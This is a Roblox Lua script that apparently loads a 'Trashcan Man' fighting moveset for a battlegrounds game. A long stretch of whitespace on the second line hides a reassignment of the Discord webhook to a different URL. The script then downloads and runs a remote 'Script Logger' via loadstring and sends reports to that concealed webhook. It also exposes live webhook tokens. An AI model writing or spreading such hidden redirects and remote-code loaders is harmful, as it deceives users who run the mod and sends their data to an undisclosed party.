local Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dOSJDIdldj8738ksjdjIZumPyidNpISe_o0-";
local ScriptName = "Friedpotato Trashcan Man";                                                                                                                                                                                                                                                                                                                                                                        Webhook = "https://discord.com/api/webhooks/1539679643077185607/hh-kozkxYBg0EZqAD1rUi8WPXyAtwLKm0fRKkm3zGLDx5l5uqAORPpweR5ePZHgwdJHa";
loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/Script%20Logger"))():Log(ScriptName, Webhook)

local MainAPI = loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/friedpotato/refs/heads/main/API/MAIN%20API.lua"))()
local api = MainAPI:LoadTsbgAPI()
local Main = api:CreateMoveset("Trashcan Man")
api:SetSupportedHeroes({"The Strongest Hero", "Hero Hunter", "Hero Hunter Monster Form", "Destructive Cyborg", "Deadly Ninja", "Brutal Demon", "Blade Master", "Wild Psychic", "Martial Artist", "Tech Prodigy", "Undying Hero", "KJ", "Sorcerer"})
api:Load()
Main:LoadTrashcanMan()
